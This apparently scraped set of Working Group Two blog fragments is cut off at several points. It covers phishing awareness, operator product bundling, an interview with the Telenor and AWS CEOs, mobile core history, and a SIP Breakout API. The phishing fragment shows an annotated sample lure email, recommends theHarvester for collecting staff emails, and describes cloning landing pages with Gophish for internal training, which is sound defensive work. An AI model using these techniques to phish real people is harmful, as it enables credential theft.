problems.\\n\\n![Hackoween](./Hackoween.png)\\n\\n\x3c!--truncate--\x3e\\n\\nThis time, we had the joy of having a hackday that included 15+ teams and yes - *pizza*.

You either came here because a **wgtwo** internal phishing campaign phished you or you are interested in learning more about phishing! For whatever reason, welcome and we hope this blog post is useful for learning one or two things about this systematic problem - phishing. \\n\\n\\n\\n## Phishing and Social Engineering\\nSocial engineering is a technique used to trick people into believing something untrue. For example, if one is pretending to be a janitor and walking past the security guard, or if one is tricking someone online to believe you are the CEO of their company. \\n\\nOver the internet, one can trick or phish people most commonly on social media, SMS, voice calls, websites, and email. Some of these phishing techniques are so popular that they receive specific names. For example, vishing relates to voice calls, and smishing relates to SMS. While these are very much relevant for **wgtwo** as we operate a mobile core network, today we will focus on the social engineering attack that is prominent via email called phishing. Furthermore, we will focus on how can we identify phishing emails, protect ourselves from phishing attacks, and provide insight into how a company could protect its employees by sharing our experiences. \\n### Example phishing email\\n\x3c!-- [image]() of a phishing email --\x3e\\n\\n<div class=\\"email\\">\\n\\nFrom:  **HR of WG2** <Tooltip text=\\"w272r84d4q@gmail.com\\" subtext=\\"The sender is not from a wgtwo.com email\\" />  \\nTo: Your Name yourname@wgtwo.com  \\nSubject: <Tooltip text=\\"Action required now\\" subtext=\\"Sense of urgency to trick you\\" /> for holiday party  \\nDate: Oct 21, 2022, 6:29 PM  \\n<hr />\\n\\nHi! \\n\\n<Tooltip text=\\"Working Group 2\\" subtext=\\"Mispelling of the company name\\" /> is celebrating the holidays.

However, we have other types.\\n\\n:::caution phishing\\n## Types of phishing attacks\\n- **Email Phishing**: sent via email\\n- **Spear phishing**: sent via email and targeted attack towards a company or set of people\\n- **Smishing**: sent via SMS\\n- **Vishing**: sent via voicecalls \\n:::\\n### Spear phishing \\nSpear phishing is a social engineering attack that targets a specific entity, company, or person. Generally speaking, these are targeted phishing attacks as they will alter the message to make it more relevant for the victim. For example, in a spear phishing email, the malicious actor would use the company logo, and other employee names within the company, leverage the company CSS and UI, and/or purchase a domain that resembles the target\u2019s entity in all efforts for tricking the victim into sharing personal information such as login credentials.\\n\\nNotably, in recent years there have been newsworthy events where spear phishing attempts have been successful in compromising companies. \\n\\nOn [Sep 16, 2022, Uber experienced a social engineering attack](https://www.uber.com/newsroom/security-update/) that allowed the malicious actor to gain access to internal resources such as Slack, HackerOne, and several internal systems including a finance portal. This is an excellent example of how a group of hackers targeted an enterprise to compromise an employee\'s credentials to gain access to not just one system but several. Briefly mentioned in this report, Uber said that they are revising the MFA internal policies. This is a key control for preventing unauthorized access - which **wgtwo** continually implements and monitor across all applications.\\n\\nSearch engines are leveraged for easy data mining of company information that can be used in spear phishing attacks. \\n\\nOne open-source tool that leverages search engines for information gathering of company data such as emails is baked into Kali Linux but also found on GitHub called [theHarvester](https://github.com/laramies/theHarvester). I can recommend checking it out!\\n\\n### Smishing \\nAs discussed previously, smishing is a social engineering attack that is leveraging the SMS protocol for sending a malicious payload to the victim. \\n\\nSmishing is a very effective attack as the sms open rate is about 99%. With such a high open rate, it is almost certain that the SMS will be viewed by the victim if not blocked by the device or operator.\\n\\nAs **wgtwo** operates a mobile core network, one goal of ours is to protect the health of the SS7 network and the hygiene of SMS traffic. Ultimately, this led to us building an internal mechanism for identifying SMS spam. From this internal solution we identified that via malicious apps installed on a mobile device, smishing messages were propagated via that malicious app behind the scenes using the mobile device\u2019s modem - unidentified by the end user. Essentially, leveraging the victim\'s device to re-propagate the phishing malware. Again, very similar to what we see in email phishing with a victim\'s email server or website getting compromised and then propagating phishing malware from this infected endpoint.\\n## Protect yourself\\nAs much as email providers and clients try to prevent phishing messages from ending in your email inbox, it is bound that everyone will eventually receive a phishing message. Thus, it is up to us to ultimately stay protected from these social engineering attacks. Here are a few best practices to help you stay secure:\\n\\n- Never share personal information such as your email address, password, or one-time-passcodes (OTPs)\\n- Don\u2019t trust email. Anyone can send you an email.\\n- Learn the effective ways of detecting phishing emails like reviewing the sender address, misspellings in the email, and incorrect information - as mentioned previously in this blog post\\n- Keep your software up-to-date to help protect from vulnerabilities being exploited. This includes your web browser and operating system.\\n- If the phishing email is sent from the CEO of the company, for example - reach out to the CEO in another communication channel like slack or SMS to confirm the email is authentic\\n- Ask for help from colleagues, friends, or family if in doubt about an email\\n\\n## Protect your company\\n### 2FA\\nEnabling 2FA today is a necessary step for the security of employee accounts and access. Take the scenario of an employee being phished and sending their login credentials to a malicious actor - well they don\'t have the one-time passcode that\'s generated on new unknown logins. Ultimately this mitigates the risk completely as the actor was unable to log in. Today we are seeing new solutions from apple and others that are building passwordless solutions. [Apple Passkeys](https://developer.apple.com/passkeys/) is an interesting solution as this leverages biometrics and your device to make an easy and secure way for authenticating.\\n### SPF DKIM and DMARC\\nAn organization is responsible for properly configuring and managing email security. Many if not all email providers allow the configuration of email authentication to prevent the unauthorized sending of emails from your company\'s domain. \\n- **SPF**: Specifies the servers and domains that are authorized to send emails on behalf of your organization.\\n- **DKIM**: Adds a digital signature to every outgoing message, which lets receiving servers verify the message came from your organization.\\n- **DMARC**: Let you tell receiving servers what to do with outgoing messages from your organization that doesn\u2019t pass SPF or DKIM.\\nBy adopting the above email authentication protocols one can create an allowlist for where they expect internal email to be originating from and a policy that tells what to do with an email that does not meet the authentication standard. This helps prevent spoofing and phishing emails originating and delivered to your employees \\n### Internal phishing campaigns\\nWe are an advocate of security through education. What might be common sense for someone is not for another. Learning is an interesting topic in itself but in reality, until one has spent the time to create an understanding or learn from an experience or event one might truly understand. However with phishing, one might know what it is and not say to click the link, but they still do that. Why might you ask? Well, we are all human and bound to make mistakes.\\n\\nOur belief is internal phishing campaigns can be used as an educational exercise but should only be viewed as an educational tool - rather than - a way to purposely trick employees into \u201cfailing\u201d an exercise. View the next section to learn more about how **wgtwo** approaches and build its internal phishing campaigns.\\n## How **wgtwo** performs internal phishing campaigns\\nAs industry best practices recommend companies perform security awareness training continually and the growing security threat of phishing leads **wgtwo** to build the capability and perform internal phishing campaigns. For an effective phishing campaign we have a few guidelines we follow:\\n\\n**Dos**\\n- Always inform employees before a phishing campaign via slack #security channel\\n- Make the phishing campaign educational\\n\\n**Don\u2019ts**\\n- Never blame an employee for clicking the link and falling a victim to the phishing campaign\\n\\nIn October 2022, during a **wgtwo** hack day, we decided to build some new automation for conducting an internal phishing campaign.\\n### Architecture for internal phishing campaigns\\n#### Tools\\n\\n[Gophish](https://github.com/gophish/gophish) is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and execute phishing engagements and security awareness training.\\n\\n![Gophish](gophish-campaign.svg)\\n\\nGophish is helpful for us because it has an API to help automate the process, with some cool features to track the delivery of emails and record who clicked the link for example. \\n\\nAs part of our process of adopting Gophish we contributed back upstream   \\n- Build and publish to ghcr.io on merge https://github.com/gophish/gophish/pull/2644\\n\\n#### Procedure\\nFor every internal phishing campaign we take the following steps:\\n\\n1. Send a notification in the #security slack channel that a new phishing campaign has been created for some time in the future\\n2. Fetch a recent list of employee names/email addresses from google admin via an API call\\n3. Upload to the Gophish server as a new email campaign via an API call\\n4. Create a new email and make it relevant for the time of year, recent events, etc. and as the payload, including the link to this blog post as security awareness training\\n\\n### Example phishing campaign email\\nCan you spot the errors in this spear phishing campaign?\\n\\n#### Gophish Campaign Landpage \\nIn Gophish we are able to \\"steal\\" the html/css of existing website sites to build our own landing page.

To make it even harder (and fun) for ourselves, we\u2019re also developing a full, API-based global product ecosystem to give telecom operators new revenue and differentiation opportunities. \\n\\nOne of the questions we get from operators is how to distribute products to their subscribers. There are multiple ways to go about it, but in this post, we\'ll show how an operator can enable products for their subscribers in what we call bundling.\\n\\n\x3c!--truncate--\x3e\\n\\n### Part one: What is bundling?\\n\\nBundling. What is bundling? Probably something like \u201cto group together and sell for one price.\\" Why would you want to group something together in a bundle? How do you bundle something abstract like a \u201cproduct\u201d, and what would you even bundle that together with? These are all good questions.\\n\\nMost people are probably familiar with the concept of \\"pre-installed applications,\\" like how your smartphone comes out of the box with software to handle SMS and MMS messages, or a web browser that might not be the one you personally prefer. You could think of this as a type of bundling - including a product or service within another product. At Working Group Two we do not make phones or applications that run on phones. We are creating an ecosystem for products that run on top of or adjacent to mobile subscriptions by using our mobile core platform (which is also a thing we are doing, as we mentioned earlier).\\n\\n### Part two: How does our bundling work? \\n\\n\u201cNow hold on,\u201d you might think, \u201cwhat\u2019s this got to do with... whatever it is you\u2019re trying to accomplish as a company?\u201d Well, here at Working Group Two we strongly believe that there is a lot of value in talking to and listening to our customers and users. One of the subjects we\u2019ve discussed at length with some of our customers is how to distribute products from the operator to their subscribers. \\n\\nSo far we\u2019ve identified three different approaches to this:\\n\\n- **1. Single**: A single subscriber gets the product, by personally activating it for their subscription. The subscriber would need to find and activate the product via some interface like an \u201capp store\u201d or marketplace. \\n- **2. Everyone**: The entirety of the subscriber base gets the product. \\n- **3. Bundling**: A subset of the subscribers gets the product, by including it into one or several plans or offerings provided by the operator.\\n\\nSome products might seem like ideal candidates for distribution through a marketplace (option 1). A product which automatically transcribes calls (into text) isn\u2019t something everyone needs, but there\u2019s definitely people who are willing to pay for such a thing. The marketplace approach introduces another distribution-related problem, however, that of distributing the knowledge of the marketplace and its contents. On the flip side, enabling a product for the entirety of the subscriber base (option 2) makes sense if said product is marketed as a core feature of the operator\u2019s subscriptions or if it\'s meant to take care of market-specific regulatory requirements.  \\n\\nOption 3 (bundling) solves the information-distribution problem of the marketplace approach by allowing the operator to market the bundled products as features of a certain subscription tier. \\n\\nHere are some examples:\\n\\n|  |  |\\n|---|---|---|\\n| **B2B mobile operators** | An operator might realize that not all of their potential customers need a full switchboard solution (known in telco language as a PBX), and decide to offer that as an \u201cadd-on\u201d or a bundled part of a higher-priced subscription package. |\\n|  | An operator could offer advanced speech-to-text solutions to lawyers, real estate agents, and translation companies to help them automate their workflows. |\\n| **B2C mobile operators** | An operator could bundle a web content filtering product along with a subscription package aimed at kids (or rather the parents of kids \u2013 who in some market segments have their own smartphones by the age of eight). |\\n|  | An operator could offer a subscription aimed towards groups of people most likely to become victims of malicious text message scams, including additional anti-scam measures. |\\n\\n\\nThe operators will be using an API where they manage their subscriptions. This is where they can activate new subscriptions, toggle high-speed data based on the users quota, and other operations.\\n\\nUsing the same API, they can send a list of which products should be bundled as part of these subscriptions. That is, the product they include in this list will be granted limited access allowing them to do their required interaction with the subscription. That may be everything from getting call information in real-time to receiving and forwarding SMSs.\\n\\nThese bundled products may be selected as part of the user\'s price plan, as e.g. enabling web filtering for kids for the subscriptions in the kids segment, or it can be additional products that the operators offer through their portal.\\n\\nThis concept of offering more tailored subscriptions to specific segments of the market is not new, but with the addition of products that leverage the Working Group Two ecosystem, the possibilities could go beyond most subscribers\u2019 current expectations of what a mobile subscription can offer.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"The team is testing out bundling in the physical world\\"\\n  src={require(\\"!file-loader!./peoplebundle.jpg\\").default}\\n  />\\n\\nOperators using the Working Group Two mobile core can already select products from our product portfolio to bundle into their various price plans via our product marketplace. All it takes is a couple of mouse clicks. And yes, of course it can be integrated with their BSS (that\u2019s a Business Support System, for things like billing, order management, and revenue management). \\n\\n### Part three: Come hang out with us\\n\\nIf this sounds exciting to you as an operator, do not hesitate to [reach out.](https://www.wgtwo.com/contact/)\\n\\nPerhaps you\u2019re not an operator, but instead a developer of sorts already working within the mobile products space or just have an idea for a product within this space?

The text is edited for length and clarity. Errors may have occurred)*\\n\\n**Sigve Brekke (CEO, Telenor Group):**\\nHello, everyone. I\'m Sigve Brekke, the Group CEO of the Telenor Group. We are a mobile operator operating across the Nordics and in Asia. We have called this the Telco Tech Talk and this is a second episode where we invite guests to talk about how technology is changing the landscape and how technology companies and telecom companies are coming together and what that really means. Today, I\'m very pleased to have two guests with me to discuss that topic.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"Telco Tech Talk\\"\\n  src={require(\\"!file-loader!./techtalk.png\\").default}\\n  />\\n\\nIt is Adam Selipsky, the CEO of Amazon Web Services, as we all know, a leading cloud services company globally. And I have Erlend Prestgard, the CEO of Working Group Two, a software and application provider. \\n\\nLet\'s jump into it and let me start with you, Adam. It\u2019s not a technical question but a cultural question. I know that you have been at Amazon from the early days and my first question is, what is your advice on how to combine the efforts of building a strong technology culture and also building a customer-centric culture?\\n\\n**Adam Selipsky (CEO, Amazon Web Services):**\\nThe cultural question is central. I mean, we see this more and more as I spend time with folks like the two of you and many other CEOs and CEOs around the world. At the end of the day, cloud technology is a means to an end. Ultimately it is about transforming the organization. And that sounds like a big claim. But those are the conversations we\'re having more and more. What leaders are realizing is that by moving to the cloud, by undergoing a digital and a data transformation, what they can really do is to put data at the center of decision making. They can move faster. They can be more innovative. Ultimately, what that implies is a cultural transformation about how the organization operates. \\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Adam Selipsky, CEO, Amazon Web Services\\"\\n  src={require(\\"!file-loader!./adam.png\\").default}\\n  />\\n\\nNow, to make that happen and to push that in a productive direction. I think that certainly at Amazon, the most important thing is a concept we call customer obsession. We always put our understanding of the customer right at the center of our decision making. We have many mechanisms for understanding at an incredibly detailed level what customers want. And then we work backwards from that. We talk a lot about the working backwards process at Amazon, where we will write press releases and FAQs for any significant new service, any significant new feature or program before we even embark on building the program or service. We work backwards from there and decide, do we have something remarkable? Is it worth building? I think by really putting the customer perspective right at the center of the core decision making is the best way to undergo cultural transformation. \\n\\nThe other thing I\'ll just hit on quickly is this concept of having a very long-term perspective, long term view, which is something that folks in the telecom industry certainly understand. But I think at software companies and a lot of other companies, it\'s less common, less pervasive to think long term. Amazon has been very good at thinking five, ten, even fifteen years down the road. Amazon Web Services is a good example of that. And to understand that building for the long term, you don\'t just take a series of short little steps, you must have a vision for the long term and build to that part of that topic. \\n\\n**Sigve:**\\nAs you are working with so many other companies with a legacy history, meaning having for so many years built a culture based on yesterday\u2019s business models and not trying to transform themselves into the future: What have you seen in successful companies trying to make this change? \\n\\n**Adam:**\\nWell, every company is a little bit different, but we do see some very common success factors. We can see repeated behavior over and over again by companies who are quickly and successful in making the transition. I would say the first is Top-Down leadership or a leadership mandate that \u201cwe are going to reinvent our business, we are going to move to the cloud, we are going to build our customer obsession, we are going to reap not only the cost benefit but become more agile and more innovative as a company.\u201d I think when leaders instill that, they need to eliminate what I sometimes call a \u201cPlan B.\u201d As long as you leave the option open for people in the company to wonder, is there a plan B? Is there another way, do they really mean it, maybe it\'ll change tomorrow. If you eliminate that and there\'s only plan A, then everybody tends to get focused in the organization. The second thing I\'ll say is that it\'s very useful to have aggressive top-down goals. You want to be deliberate, and you want to be careful. We\'ve seen many teams succeed by saying \u201cWe\'re going to move applications in a month.\u201d There was a CIO of one very large global corporation who did that. By doing that, it gets the team to think differently about what we would have to do to move quickly. The final thing I\'ll say is important as to who you hire and who you develop. I think it\'s important to recruit and train people that want to build, people that want to innovate. And then you free them. You unleash them to do that. It really starts with having the right people in the company. \\n\\n**Sigve:**\\nVery valuable advice. I must admit that being the CEO of a very successful company over the years, the way I look at that is that one thing is what you need to do yourself. The other main thing you can do to achieve this is to do it through partnerships. You need to change from treating partners like vendors into forming more long-term strategic partnerships. I see that a lot of the innovation is happening in partnership with companies like yourself and other technology companies. This is also a way for us to change our culture.\\n\\n**Erlend:**\\nI think you said one thing that I noticed, Adam, which is your incredible, long-term focus. I think we see that as a customer and an AWS user every day. It\u2019s the idea that what we build on today is based on decisions that were made five, ten years ago. There is, I would say, a similar approach in Telenor. I think one noticeable difference between AWS and Telenor is the ability to change and move fast with a long-term mindset, the degree of control of technology and the ability to build and iterate. Short cycles within the long-term perspective. I think that one of the challenges for telecom companies is that they work on these decade-long cycles but the ability to do micro changes within that decade is something that I think the industry really needs to tackle. I think AWS plays a big role in enabling gradual micro improvements in a long-term perspective.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"Erlend Prestgard, CEO, Working Group Two\\"\\n  src={require(\\"!file-loader!./erlend.png\\").default}\\n  />\\n\\n**Adam:**\\nThere\'s a cultural point and a technology point there. And on the cultural side at Amazon, we talk sometimes about being strategically patient and tactically impatient. The strategic patience is really having a long- term view of \u201cwe are going to get this right as a business.\u201d It may take multiple tries. We\'re going to have a very long-term view of it. But then, we don\'t just kind of keep putting more money and more people into things that aren\'t working. We\'ll adjust, we\u2019ll measure, we\u2019ll be very self-critical about what\'s working and what\'s not working. We\'ll change a lot of things along the way so that it\'s a combination of long-term focus and short-term adjustments. I think on the technology side, it\'s a very fundamental and important observation. Obviously, telco infrastructure, as you said, is not something which changes every three months or every year. And that\'s why the move to the cloud is so fundamental. You now see telecoms building in the cloud and starting to push services out to the edge using the cloud. I think that it creates a lot more flexibility. You see people building with microservices and having automated deployments. That speeds up all the deployments and provides the flexibility of the cloud for the telco core.  I mean, Telenor is an early runner, with a low-cost virtual mobile network brand in Sweden. You have a cloud-based mobile core developed and managed as a service, in collaboration with Working group Two, Telenor and AWS.  I think that\'s the type of environment we need. We can\'t invent the next G overnight, but we can work much more nimbly, much more rapidly and with much, much lower capital cost for telecoms.\\n\\n**Sigve:**\\nErlend, you have taken a position in Europe to try to disrupt the telecom industry by building core mobile platforms in the cloud. We are testing that out ourselves in our own operations. You are also now starting to get external customers. If that really works, this will be a very different software-based way of providing core platform services. How do you see the potential of that? \\n\\n**Erlend:**\\nI think what we\'re going to see is what AWS did to data centers. You\'re going to see something similar happening to operators. One way of looking at what AWS did to data centers is, you know, everybody had their own data centers running in their own specific ways that were fairly closed and quite specific to the individual deployments. AWS comes in, deploys globally consistent infrastructure and makes it available for third parties. They invite third parties to build on top of it and to publish their products in a marketplace-like logic.  I think what we\'re going to see is a move towards mobile core platforms for operators where you build a globally consistent set of functionalities that allows you to scale, to attract developers and build global marketplaces. But that can almost only be done if you leverage the global ecosystem of infrastructure providers like Amazon. I think for us, AWS is an absolutely critical factor in putting our application on top of the AWS system in a way that allows the business dynamics that AWS unleashed in the infra layer, also in the telco\\napplication layer. \\n\\n**Sigve:**\\nOne question I\'m often hearing, Adam, is that with security regulations becoming tighter due to developments within areas such as data privacy, is there a limitation to how much we can use the cloud in the telecom space?\\n\\n**Adam:**\\nPrivacy and security is an incredibly important topic and you see a lot of data sovereignty concerns and a lot of questions about national boundaries\\nand how data should be treated within and across nations and customers. Consumer privacy is paramount. We\'ve always, since day one, had security as our absolute number one priority. No debate, no questions asked, no deviation allowed.

What was your first meeting with a live mobile core? \\nI started working for Bouygues Telecom, the third French mobile operator, in 1995. This was during their initial rollout. I was working as a BSS field technician and I participated in the deployment of the first Mobile Switching Center (MSC) in the south of France.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"General illustration, courtesy Ericsson\\"\\n  src={require(\\"!file-loader!./ericsson1.jpg\\").default}\\n  />\\n\\nThis node entity alone completely filled a 400m2 room with three rows, hundreds of back-to-back racks and thousands of specific boards and items... This was very impressive and scary! This equipment was able to handle 100 000 subscribers to make voice calls. SMS had not been introduced at that time \ud83d\ude42\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"General illustration, courtesy Ericsson\\"\\n  src={require(\\"!file-loader!./ericsson2.jpg\\").default}\\n  />\\n\\nAfter that we\u2019ve seen the telecom world developing rapidly. First we saw smaller room sizes with more compact boards and shelves. The cores could handle more functions, had more capacity and could support more subscribers. This was the last step of pure telecom hardware using common vendor boards (also known as Advanced Telecommunications Computing Architecture - or ATCA). This was also the end of Time-division Multiplexing (TDM) and the start of Internet Protocol (IP) transport. Shortly after virtualization arrived, first on dedicated blades on-premises and today on the public cloud.\\n\\n### 2. Which role does the core play in a modern mobile network?\\nToday network technology and standards are going through rapid evolution. This is quickly making equipment obsolete. A core network needs to stay up to date to handle new functionalities, network slicing and so on. Virtualization on the cloud is the way to be able to follow this race with lower investment and faster than conventional core equipment for mobile operators. Internet of Things (IoT) operators, for example, have many subscribers but with low revenue for each subscriber, so to stay profitable it is less expensive for them to go with Network As-a-Service (NaaS) than with a traditional core network. \\n \\n### 3. What are the main challenges with making mobile cores programmable and running them as-a-service? \\nRunning a mobile network as-a-service has many benefits for operators. Networks are increasingly complex so it is difficult to retain the competent people you need to operate them, maintain network performance, and to deploy the latest technology updates. It is also attractive with the shift to a pay-per-use subscription model and the possibility to scale up or down as needed.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    margin:\\"40px auto\\"\\n  }}\\n  caption=\\"Stephane Savonitto\\"\\n  src={require(\\"!file-loader!./stephane.jpg\\").default}\\n/>\\n\\nBut the as-a-service model also introduces new challenges for mobile service providers:\\n- They have to adopt new technologies rapidly and deploy new services by closely following new standards and market trends. \\n- They need to have the capability to automate tasks. \\n- They need to maintain standards capability on the edge and be able to interconnect to any legacy core networking equipment. \\n- They need to ensure that the highest level of security is always up to date on the network\\n- They need to be able to shift the focus from merely operating their core to offering innovative, new services to their customers. \\n\\n\\n*Want to learn more about Working Group Two\u2019s cloud-native and programmable mobile core platform?

It simplifies the process of deploying SIP-enabled services, such as a PBX.\\n\\n![Abundance of fruit in market stall](./fruit-landscape.png)\\n\\n\x3c!--truncate--\x3e\\n\\n\\nThe [SIP Breakout](https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites) allows for configuration on a per-subscription basis, which means that operators on the Working Group Two platform can easily offer a range of different SIP-services to their customers. The typical example is a PBX, otherwise known as a switchboard. \\n\\nMeanwhile a product developer - say, a company that makes PBXs for a living - benefits from implementing their product once for all operators on the platform. That means no major new development project every time, but a one-time implementation on a standardized and well-documented public API. (Insert upbeat music here). \\n\\n> **Fact box**\\nHold on a second, what\u2019s a SIP? A Session Initiation Protocol (SIP) session is any live communication, such as phone calls, conferencing and even video. The \u201cprotocol\u201d part of the term just means that it\u2019s a set of universal standards for computer communication. Typical examples of a SIP-enabled service are phone calls with Voice over IP, switchboard/PBX and even computer games.\\n\\nSo what\u2019s in it for people using the mobile network? This means that when your local plumbing company or that huge global accounting firm asks their mobile operator for a PBX to help them manage calls and messages with their customers they don\u2019t get a one-size-fits-all solution. The operator can offer them a variety of solutions and usage-based, scalable pricing models. \\n\\n**Let\u2019s drill down a bit further.** \\n\\nBy introducing our new SIP Breakout API we open up our core network to a range of SIP-enabled products. This is significant because SIP products are a bit more complex than other products. So simplifying and standardizing the process makes a difference. The new API allows PBX providers to plug their SIP-enabled endpoints into the call path. This establishes a session integration between Working Group Two\u2019s core and a PBX for a given MSISDN (a unique number that identifies a mobile phone on a network). \\n\\nVirtual SIP registrations are used to alter default call behavior and involve (e.g. a) PBX into the SIP signaling path. For mortals, this simply means that a phone call into a network can be answered, closed or routed somewhere. You can also think about it as registering and unregistering on the network. \\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./fruit-small.png\\").default}\\n/>\\n\\nDevelopers don\u2019t need a lot of knowledge about the [call path](https://www.nextiva.com/voip-definitions/call-path.html), they can use the SIP Breakout API to get signaling to their PBXs, voicemail systems and other SIP-enabled services. \\n\\nThe API is implemented as a [gRPC](https://en.wikipedia.org/wiki/GRPC) service. We believe it is a more reliable way of implementing and supporting almost any language. When we dropped our first batch of public APIs back in March, we also explained why we\u2019ve chosen gRPC. \\n\\n[SIP Breakout](https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites) is available as a public API. You can play around with it in our sandbox right now."},{"id":"what-we-build-right-now-june22","metadata":{"permalink":"/jp/blog/what-we-build-right-now-june22","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-06-23-what-we-build-right-now-june22/index.md","source":"@site/../blog/2022-06-23-what-we-build-right-now-june22/index.md","title":"What we\'re building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ","description":"Our global mobile core platform is rapidly evolving.

Our as-a-service model and programmable core capabilities allow for high performance, operational simplicity and reduced costs for 5G SA.\\n\\n**5G Non-Standalone** (5G NSA) is in production. NSA makes it easier for operators to deploy a 5G network - because they can reuse current 4G facilities. Together with 2G/3G full-MVNO/national roaming capabilities and full 4G/5G capabilities operators can now get a \u201cG-neutral\u201d core network.\\n\\n**Telavox**, a leading UCaaS provider from the Nordics, is now live on the Working Group Two platform - which means that we have integrated their mobile unified comms technology and PBX on our platform via an API. [Telavox](https://telavox.com) is known for an excellent user experience and a strong feature set and we believe they are one of the most attractive global providers of UCaaS and PBX services.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./anna.jpg\\").default}\\n/>\\n\\nWe have developed interfaces that enable **real-time online charging control** (Gy/Ro) and have gone live with this capability with our first OCS/BSS partners.\\n\\nWant to control content? This spring, we enabled **content filtering** on our platform, providing control on a per-subscriber basis. The integration uses the Internet Content Adaptation Protocol [(ICAP)](https://en.wikipedia.org/wiki/Internet_Content_Adaptation_Protocol) for inspecting HTTP-based traffic and DNS-based filtering of data traffic. This system can be used for everything from parental control to enforcing corporate policies.\\n\\n\\n### Voice is on your lips\\nVoice continues to be relevant across \u201cGs\u201d, usage areas and handset types. With our unique approach, we can rapidly adapt our voice stack to emerging needs - such as:\\n\\nEnabling voice for **5G Standalone** (VoNR) is in the works. We see the strong effects of taking a platform approach, where adding VoNR becomes a relatively straightforward exercise.\\n\\nWe continue getting our **IMS stack certified for an increasing number of handsets** across several markets and operator codes. We can see the effects of our platform approach here as well, where each device, operator and market becomes easier. A new operator on the platform can with confidence know that certifications will be passed and carrier bundles issued.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./nicholas_anna.jpg\\").default}\\n/>\\n\\nIn **Japan** we have a fantastic demo where the customer can plug in a base station, and minutes later be able to make VoLTE calls between devices in a private network setting. Japan has for a long time had what they call sXGP (a standard for unlicensed 4G  spectrum). At Working Group Two we are building a complete private network solution that in addition to data, also includes includes communication services.\\n\\nWe\u2019re **rolling out VoLTE roaming** with a major IoT player.

Give your vendor a service-level agreement instead and let them figure out how to solve your business needs](./RFP_illustration_large.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\nConsider CKH IOD, an innovation unit of CK Hutchison, one of the world\'s leading mobile operator groups. When [they announced](https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/) a few months ago that they will be moving their mobile core network to the public cloud - and have it delivered as-a-service by Working Group Two -  they benefit from more than a new technology platform. They enter a new way of thinking about incentives - where vendors and operators truly share the benefits of growing together. More importantly, CKH IOD proves that they both can and want to innovate. \\n\\nOne of their main ambitions is to reduce complexity. The value of reducing complexity is to be able to make changes faster - and more affordably. \\n\\n**And therein is the power of as-a-service over a managed service**. It\u2019s the idea that you can only get platform thinking to flourish when you throw out your rigid approach of making every change a business case. \\n\\nGranted, it\u2019s not about totally letting go of control across commercial, technological, and legal dimensions. Your contract needs to allow for frequent, small changes while your tech setup needs to allow for safe and efficient rollout of these frequent changes. \\n\\nOperators wanting to innovate must consider the underpinning, but tricky idea of incentives. To drive change, you actively need to manage incentives. In a traditional, managed services setup, operators specify a detailed scope from their vendors and conduct some kind of auction to select their vendor. \\n\\nThis means that when vendors respond to a request, their incentives are to deliver on the scope defined in the cheapest way possible. And that, in short, defines the relationship three or four years down the road until the next major request for proposals comes along. For the traditional vendor, the economic upside is to save cost by delivering as cheaply as possible and by driving as many pricey change requests they can. Fundamentally, then, things either remain static or every change needs a business case. Yawn. \\n\\n**Complex, yet simple animals**. That\u2019s the short way of thinking about operators\u2019 incentives.\\n\\nSimple in the sense that operators are driven by basic things like revenue per user, churn, and customer acquisition costs. They want to increase their topline and decrease their cost. They are constantly pressured to increase usage, adjust to macroeconomic conditions, and get ready to jump on the next \u201cG.\u201d The reality is often that they are unable to increase their revenues, so life is about finding the next avenue for cost reduction. \\n\\nComplex, because achieving cost reductions and driving growth require changes. Just waiting for the next \u201cG\u201d delivers no differentiation versus competitors. Operators have been amazingly innovative in marketing and billing, but that is mostly driven by improvements in IT. At the network level, the fundamentals have essentially stayed the same since the advent of SMS. \\n\\nTo be a bit blunt, operators have in some ways chosen the worst of both worlds. They have chosen an outsourced model, but they\u2019re not taking advantage of it. Technology vendors are essentially told how to solve the problem. \\n\\nInstead, operators should give them a service-level agreement (SLA) with what they want to achieve and then let the vendor figure out how to solve it. While the rest of the world has figured out when to do things in-house and when to outsource, mobile operators are often stuck in the middle. \\n\\n**What\u2019s the magic pill?** Micro innovation at scale. How do you make it happen? In the words of Appledore Research, by understanding that as-a-service is more than a simple substitution of capital costs with an operational one - and more than replacing a one-time expense with an amortized one. \\n\\nHere\u2019s how Robert Curran at Appledore Research broke it down in his recent report on the significance of the deal between Working Group Two and CKH IOD. \\n\\n|                       |                                      **Managed Service**                                      |                                         **As-a-Service**                                         |\\n|:---------------------:|:---------------------------------------------------------------------------------------------:|:------------------------------------------------------------------------------------------------:|\\n|     